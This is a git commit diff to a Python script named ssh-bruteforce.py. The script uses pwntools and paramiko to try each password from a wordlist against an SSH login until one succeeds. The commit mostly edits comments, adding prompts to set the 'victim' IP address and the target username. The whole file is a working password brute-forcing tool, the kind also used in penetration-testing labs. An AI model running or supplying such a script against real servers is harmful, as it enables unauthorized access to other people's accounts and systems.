4ce0a6c52798756cf988a39b819917990f9f8b22
htay-coder <82677612+htay-coder@users.noreply.github.com>
2024-08-16 22:02:19 -0400

    Update ssh-bruteforce.py

--- ssh-bruteforce.py
+++ ssh-bruteforce.py
@@ -1,24 +1,21 @@
 from pwn import *
 import paramiko
 
-host = "127.0.0.1"
-username = "kali"
+host = "127.0.0.1" # Change this to the IP address of the victim
+username = "kali" # Change this to the username of the user to be brute-forced into
 attempts = 0 
 
-# In order to perform bruteforcing we need to iterate over passwords in a word file
-with open("ssh-common-passwords.txt", "r") as password_list:
+with open("ssh-common-passwords.txt", "r") as password_list: # Change this to select your wordlist
     for password in password_list:
-        password = password.strip() # Get rid of new lines in password wordlist
-        try: # Try statement to handle authentication errors
+        password = password.strip() 
+        try: 
             print("[{}] Attempting password: '{}'!".format(attempts, password))
             response = ssh(host=host, user=username, password=password, timeout=1) 
-# From pwn module with host 127.0.0.1 and timeout to give up after 1 second 
-            if response.connected(): # Checks if response is valid
+            if response.connected(): 
                 print("[>] Valid password found: '{}'!".format(password))
-                response.close() # Close out after finding a valid password
+                response.close() #
                 break
-            response.close() # Close the connection and try all over again in a loop if the  # password fails or until the words from the wordlist have been attempted
-        except paramiko.ssh_exception.AuthenticationException: # Use an exception to tell
-# the user if the password is not valid
+            response.close() 
+        except paramiko.ssh_exception.AuthenticationException: 
             print("[X] Invalid password!")
         attempts += 1
